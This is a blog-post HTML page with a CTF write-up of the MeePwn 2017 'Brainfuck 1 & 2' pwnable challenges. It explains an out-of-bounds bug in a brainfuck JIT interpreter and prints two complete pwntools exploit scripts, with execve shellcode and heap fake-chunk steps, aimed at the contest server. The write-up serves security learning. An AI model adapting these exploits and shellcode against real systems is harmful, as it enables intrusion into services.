@@ -1,0 +1,809 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>MeePwn CTF 2017 – Brainfuck 1 &amp; 2 - Hacking Tube 2.0</title>
+<meta name="description" content="Category: Pwnable">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="MeePwn CTF 2017 – Brainfuck 1 &amp; 2">
+<meta property="og:url" content="http://0.0.0.0:4000/MeePwn-CTF-2017-Brainfuck-1-2/">
+
+
+  <meta property="og:description" content="Category: Pwnable">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2017-07-16T23:28:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/MeePwn-CTF-2017-Brainfuck-1-2/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="MeePwn CTF 2017 – Brainfuck 1 &amp; 2">
+    <meta itemprop="description" content="Category: Pwnable">
+    <meta itemprop="datePublished" content="July 16, 2017">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> Pwnable</p>
+
+<p>Both binaries are 64 bit ELF, No RELRO, No canary, PIE &amp; NX enabled.</p>
+
+<!-- more -->
+
+<h2 id="brainfuck1">Brainfuck1</h2>
+
+<p>The program is a simple <a href="https://en.wikipedia.org/wiki/Brainfuck">brainfuck</a> language interpreter: it read input ( brainfuck code ), translate the code to the corresponding x86 machine code and execute it.</p>
+
+<p>For example, if we input <code class="highlighter-rouge">+++++++++</code> ( 9 <code class="highlighter-rouge">+</code> ), the program will translate the code into the following machine code:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x7ffff7ff5000:      push   rbp
+0x7ffff7ff5001:      mov    rbp,rsp
+0x7ffff7ff5004:      sub    rsp,0x20
+0x7ffff7ff5008:      mov    r14,rdi   ; r14 is the data pointer 
+0x7ffff7ff500b:      add    BYTE PTR [r14],0x9  ; [r14] += 9 
+0x7ffff7ff500f:      add    rsp,0x20
+0x7ffff7ff5013:      pop    rbp
+0x7ffff7ff5014:      ret 
+</code></pre></div></div>
+
+<p>The program has the following data structure:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">bf_data</span><span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">dp</span><span class="p">;</span> <span class="c1">// data pointer
+</span>    <span class="kt">char</span> <span class="o">*</span><span class="n">sc_buf</span><span class="p">;</span> <span class="c1">// machine code buffer
+</span>    <span class="n">__int64</span> <span class="n">field_16</span> <span class="p">;</span> <span class="c1">// not sure about the usage
+</span>    <span class="n">__int64</span> <span class="n">sc_pos</span><span class="p">;</span>  <span class="c1">// machine code position
+</span>    <span class="n">__int64</span> <span class="n">sc_size</span><span class="p">;</span> <span class="c1">// machine code buffer size
+</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">bf_data</code> is placed on the heap memory. It will treat <code class="highlighter-rouge">bf_data-&gt;dp</code> as the first parameter while executing the machine code.</p>
+
+<p>The vulnerability is quite simple: it did not have the boundary check for the data pointer increment/decrement. For example, it we input 1000 <code class="highlighter-rouge">&gt;</code> and a <code class="highlighter-rouge">,</code>, we can write a byte at <code class="highlighter-rouge">bf_data-&gt;dp + 1000</code>, thus we have an out-of-bound read/write vulnerability.</p>
+
+<p>Here’s the basic concept of how I exploit the service:</p>
+<ol>
+  <li>Leak the machine code buffer address ( an mmap address with <code class="highlighter-rouge">rwx</code> permission )</li>
+  <li>Place our shellcode on the mmap buffer</li>
+  <li>Self-modified the machine code in <code class="highlighter-rouge">bf_data-&gt;sc_buf</code> so it will jump to our shellcode buffer and execute our shellcode.</li>
+</ol>
+
+<p>First we use the OOB read to leak the machine code buffer address. After that, we use OOB write to overwrite <code class="highlighter-rouge">bf_data-&gt;dp</code>, making it point to our shellcode buffer, then use <code class="highlighter-rouge">&gt;</code> and <code class="highlighter-rouge">,</code> to write our shellcode to <code class="highlighter-rouge">bf_data-&gt;dp</code>.</p>
+
+<p>Now because <code class="highlighter-rouge">bf_data-&gt;dp</code> is near to <code class="highlighter-rouge">bf_data-&gt;sc_buf</code>, so again we can use the OOB write to modify the content of <code class="highlighter-rouge">bf_data-&gt;sc_buf</code>, creating a <strong>self-modified machine code</strong> situation. I decided to modify the end of the machine code into:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov rax, shellcode_buf_addr
+call rax
+</code></pre></div></div>
+
+<p>```python exp_bf1.py
+#!/usr/bin/env python</p>
+
+<p>from pwn import *
+import subprocess
+import sys
+import time</p>
+
+<p>HOST = “139.59.244.42”
+PORT = 31337
+ELF_PATH = “./bf1”</p>
+
+<p>context.binary = ELF_PATH
+context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
+context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach</p>
+
+<p>elf = context.binary # context.binary is an ELF object</p>
+
+<p>def cmd(s):
+    r.sendlineafter(“»”, s)</p>
+
+<p>def write(move, content):
+    payload = “”
+    if move &lt; 0:
+        payload = “&lt;” * abs(move)
+    else:
+        payload = “&gt;” * abs(move)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload += ",&gt;"*len(content)
+
+cmd(payload)
+r.sendline(content)
+</code></pre></div></div>
+
+<p>sc = “\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05”</p>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
+
+# leak mmap address 
+payload = "&lt;"*0x28 # move to &amp;bf_data-&gt;sc_buf
+payload += ".&gt;"*8
+
+cmd(payload)
+sc_base = u64(r.recvuntil("&gt;&gt;")[:8:]) &gt;&gt; 8
+r.unrecv("&gt;&gt;")
+log.success("sc_base: "+hex(sc_base))
+
+# make size = 0x400 so it won't clear our shellcode
+write(-0x10, p64(0x400))
+# change bf_data-&gt;dp = our shellcode buffer
+write(-0x30, p64(sc_base+0x800))
+# write final shellcode to our shellcode buffer
+write(0, sc)
+# write to bf_data-&gt;sc_buf ( it will become a self-modified shellcode)
+init_sc = asm("mov rax, %s" % hex(sc_base+0x800))
+init_sc += asm("call rax")
+print "init_sc", init_sc.encode('hex')
+print "len:", len(init_sc)
+write(-0x70d, init_sc)
+r.interactive() ```
+</code></pre></div></div>
+
+<p>flag: <code class="highlighter-rouge">MeePwnCTF{this_is_simple_challenge_:banana-dance:}</code></p>
+
+<h2 id="brainfuck2">Brainfuck2</h2>
+
+<p>For Brainfuck2, the binary is basically the same as Brainfuck1, except it has the following exectuting process:</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BrainFuckVM</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="n">BrainFuckVM</span><span class="o">::</span><span class="n">run</span><span class="p">(</span><span class="n">BrainFuckVM</span> <span class="o">*</span><span class="k">this</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">sc_buf</span><span class="p">;</span> <span class="c1">// ST20_8@1
+</span>    <span class="n">BrainFuckVM</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// ST18_8@1
+</span>    <span class="n">BrainFuckVM</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// rax@3
+</span>
+    <span class="n">sc_buf</span> <span class="o">=</span> <span class="k">this</span><span class="o">-&gt;</span><span class="n">sc_buf</span><span class="p">;</span>
+    <span class="n">v2</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
+    <span class="cm">/* allocate + memset bf_data-&gt;dp */</span>
+    <span class="k">this</span><span class="o">-&gt;</span><span class="n">dp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="k">operator</span> <span class="k">new</span><span class="p">[](</span><span class="mh">0x100uLL</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="k">this</span><span class="o">-&gt;</span><span class="n">dp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
+    <span class="cm">/* set the sc_buf's permission to r-x*/</span>
+    <span class="n">mprotect</span><span class="p">(</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">sc_buf</span><span class="p">,</span> <span class="n">v2</span><span class="o">-&gt;</span><span class="n">sc_size</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span> 
+    <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="n">sc_buf</span><span class="p">)(</span><span class="k">this</span><span class="o">-&gt;</span><span class="n">bf_mem</span><span class="p">);</span>
+    <span class="cm">/* set the sc_buf's permission back to rw-*/</span>
+    <span class="n">mprotect</span><span class="p">(</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">sc_buf</span><span class="p">,</span> <span class="n">v2</span><span class="o">-&gt;</span><span class="n">sc_size</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
+    <span class="k">this</span><span class="o">-&gt;</span><span class="n">sc_pos</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">sc_buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v2</span><span class="o">-&gt;</span><span class="n">sc_size</span><span class="p">);</span>
+    <span class="cm">/* free bf_data-&gt;dp */</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="k">this</span><span class="o">-&gt;</span><span class="n">dp</span> <span class="p">)</span>
+      <span class="k">operator</span> <span class="k">delete</span><span class="p">(</span><span class="k">this</span><span class="o">-&gt;</span><span class="n">dp</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
+    <span class="k">this</span><span class="o">-&gt;</span><span class="n">dp</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Several changes are made:</p>
+<ol>
+  <li>We can hardly control the address of <code class="highlighter-rouge">bf_data-&gt;dp</code>, it will only be allocated before the execution of the machine code.</li>
+  <li>The <code class="highlighter-rouge">bf_data-&gt;sc_buf</code>’s permission is changed to <code class="highlighter-rouge">r-x</code>, so this time the self-modified trick won’t work.</li>
+</ol>
+
+<p>Luckily, the vulnerability is still there – we can still use the OOB read/write to do some evil stuff ;)</p>
+
+<p>First of all, we can still use the OOB write to modify the <code class="highlighter-rouge">bf_data-&gt;dp</code> pointer, and because later the program will free this pointer, this means that <strong>we can control the address that is being freed</strong>.</p>
+
+<p>After program free the <code class="highlighter-rouge">bf_data-&gt;dp</code> pointer, the first memory allocation will be the command line buffer, which chunk size is <code class="highlighter-rouge">0x110</code>. If we freed a buffer with address <code class="highlighter-rouge">addr</code> and size = 0x110, later when the program allocate a memory for the command line buffer, it will take <code class="highlighter-rouge">addr</code> as the new buffer, <strong>and so we can control the content of <code class="highlighter-rouge">addr</code></strong> by input our command ( the brainfuck code ).</p>
+
+<p>Based on the above concept, I decided to do the following:</p>
+<ol>
+  <li>Use OOB read to leak the heap address</li>
+  <li>Use OOB write to create fake chunk at <code class="highlighter-rouge">bf_data - some_offset</code></li>
+  <li>Use OOB write to overwrite <code class="highlighter-rouge">bf_data-&gt;dp</code>, making it point to our fake chunk</li>
+</ol>
+
+<p>By doing this, the program will eventually allocate <code class="highlighter-rouge">bf_data - some_offset</code> to the command line buffer, <strong>and thus making us able to control <code class="highlighter-rouge">bf_data</code> by input the next brainfuck code</strong>.</p>
+
+<p>Since now we can control the structure of <code class="highlighter-rouge">bf_data</code>, all we need to do is to overwrite the <code class="highlighter-rouge">bf_data-&gt;sc_buf</code>, making it point to our shellcode buffer, so we can execute our own shellcode and capture the flag. Before we overwrite <code class="highlighter-rouge">bf_data-&gt;sc_buf</code>, there’re several things we’ll need to be aware of:</p>
+<ol>
+  <li>We’ll have to write our shellcode in our shellcode buffer first. Since we can’t control <code class="highlighter-rouge">bf_data-&gt;dp</code>, I decided to use the <code class="highlighter-rouge">[&gt;.,]</code> brainfuck code to write my shellcode. The brainfuck code will keep reading our input until it encounters a null byte ( thanks to wikipedia ). Our shellcode will be placed on <code class="highlighter-rouge">bf_data-&gt;dp + some_offset</code>.</li>
+  <li>Notice the program will modify the first several bytes of our shellcode, so it’s better to pad some <code class="highlighter-rouge">NOP</code> at the beginning of our shellcode.</li>
+  <li>To avoid the program changing our shellcode into the <code class="highlighter-rouge">ret</code> instruction, we’ll have to overwrite the <code class="highlighter-rouge">bf_data-&gt;sc_pos</code> data as well ( because the program will place the <code class="highlighter-rouge">ret</code> machine code at <code class="highlighter-rouge">bf_data-&gt;sc_buf + bf_data-&gt;sc_pos</code> ). Overwrite this data to a large number, so the <code class="highlighter-rouge">ret</code> instruction won’t effect our shellcode.</li>
+</ol>
+
+<p>Final exploit script:
+```python exp_bf2.py
+#!/usr/bin/env python</p>
+
+<p>from pwn import *
+import subprocess
+import sys
+import time</p>
+
+<p>HOST = “139.59.244.42”
+PORT = 31338
+ELF_PATH = “./bf2”</p>
+
+<p>context.binary = ELF_PATH
+context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
+context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach</p>
+
+<p>elf = context.binary # context.binary is an ELF object</p>
+
+<p>def cmd(s):
+    r.sendlineafter(“»”, s)</p>
+
+<p>def write(move, content, scmd=None, scontent=None):
+    payload = “”
+    if move &lt; 0:
+        payload = “&lt;” * abs(move)
+    else:
+        payload = “&gt;” * abs(move)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload += ",&gt;"*len(content)
+if scmd:
+    payload += scmd
+    content += scontent
+payload = payload.ljust(512, "B")
+
+cmd(payload)
+r.sendline(content)
+</code></pre></div></div>
+
+<p>def leak(move, cnt):
+    if move &lt; 0:
+        payload = “&lt;” * abs(move)
+    else:
+        payload = “&gt;” * abs(move)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload += ".&gt;"*cnt
+payload = payload.ljust(512, "B")
+
+cmd(payload)
+r.recv(1024) # ¯\_(ツ)_/¯ 
+ret = r.recvuntil("&gt;&gt;")[:-2:]
+r.unrecv("&gt;&gt;")
+return ret
+</code></pre></div></div>
+
+<p>sc = “\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05”</p>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = None
+if len(sys.argv) == 2:
+    r = process(ELF_PATH)
+else:
+    r = remote(HOST, PORT)
+
+# make unsortbin + libc address
+cmd("A"*512)
+
+# leak
+libc.address = u64(leak(0x110, 8)) - 0x3c3b78 # local
+log.success("libc base: "+hex(libc.address))
+heap_addr = u64(leak(-0x30, 8))
+log.success("heap_addr: "+hex(heap_addr))
+fake_chunk = heap_addr - 0x70
+log.success("fake_chunk: "+hex(fake_chunk))
+sc_buf = heap_addr + 0x3b0# our shellcode buffer
+log.success("sc_buf: "+hex(sc_buf))
+
+# fake chunk
+write(-0x78, p64(0x111) )
+special = "&lt;"*0xd0 + ",&gt;"*8
+# fake next size
+write(0x98, p64(0x71),special, p64(fake_chunk))
+# create gets-like function, puts shellcode @ 0xXXXXX000 ( our shellcode buffer)
+cmd(",[&gt;.,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,[&gt;.,]")
+payload = "i"*0x108 + "\xa1\x01\x02\x00" # fake next size
+payload += "i"*0x190
+payload += "\x90"*0x10 + sc + "\x00"
+r.send(payload)
+# overwrite bf_data, make bf_data-&gt;sc_buf point to our shellcode buffer
+payload = "i"*0x40
+payload += p64(0) + p64(sc_buf) + p64(0x100) + p64(100) + p64(0x1000) + p64(0x111)
+cmd(payload)
+r.interactive()
+</code></pre></div></div>
+
+<p>```</p>
+
+<p>flag: <code class="highlighter-rouge">MeePwnCTF{My_M33pwn_h34p_1s_fun?}</code></p>
+
+<p>Got both first blood on these challenges ! WOOHOO ! 😎🤘</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#brainfuck" class="page__taxonomy-item" rel="tag">brainfuck</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap" class="page__taxonomy-item" rel="tag">heap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#meepwn" class="page__taxonomy-item" rel="tag">MeePwn</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#shellcode" class="page__taxonomy-item" rel="tag">shellcode</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2017-07-16T23:28:00+08:00">July 16, 2017</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=MeePwn+CTF+2017+--+Brainfuck+1+%26+2%20http%3A%2F%2F0.0.0.0%3A4000%2FMeePwn-CTF-2017-Brainfuck-1-2%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2FMeePwn-CTF-2017-Brainfuck-1-2%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2FMeePwn-CTF-2017-Brainfuck-1-2%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/MeePwn-CTF-2017-anotherarena/" class="pagination--pager" title="MeePwn CTF 2017 – anotherarena
+">Previous</a>
+    
+    
+      <a href="/hxp-CTF-2017-hardened-flag-store/" class="pagination--pager" title="hxp CTF 2017 – hardened_flag_store
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-anotherarena/" rel="permalink">MeePwn CTF 2017 – anotherarena
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/MeePwn-CTF-2017-Brainfuck-1-2/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/MeePwn-CTF-2017-Brainfuck-1-2"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
